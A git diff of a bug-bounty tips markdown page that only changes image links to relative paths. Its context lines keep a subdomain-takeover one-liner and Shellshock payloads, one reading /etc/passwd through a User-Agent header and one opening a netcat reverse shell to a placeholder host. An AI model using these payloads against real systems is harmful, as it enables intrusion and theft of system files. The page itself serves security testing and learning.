@@ -94,9 +94,9 @@ Location : https://abc.com/v1/proxy/authentication/authenticate
 Location : https://abc.com/user/dashboard
 ```
 ## DOM XSS
-![dom-xss](/Writeups/Bug-Bounty-Tips/img/20201007_195906.jpg)
+![dom-xss](img/20201007_195906.jpg)
 ## WAF Bypass 
-![waf-bypass](/Writeups/Bug-Bounty-Tips/img/waf-bypass.jpg)
+![waf-bypass](img/waf-bypass.jpg)
 ## Automate Subdomain Takeover
 ```sh
 cat subfinder -dL domain.txt -o sub.txt && subjack -w sub.txt |toslack
@@ -144,6 +144,6 @@ User-Agent: () { :;}; echo $(</etc/passwd)
 () { :;}; /usr/bin/nc ip 1337 -e /bin/bash
 ```
 ## Github Dorks cheat sheet
-![cheatsheet](https://github.com/thevillagehacker/Bug-Hunting/blob/main/Writeups/Bug-Bounty-Tips/img/gitdork.jpg)
+![cheatsheet](img/gitdork.jpg)
 ## SQLi
-![sqli](https://github.com/thevillagehacker/Bug-Hunting/blob/main/Writeups/Bug-Bounty-Tips/img/sqli-2.jpg)
+![sqli](img/sqli-2.jpg)
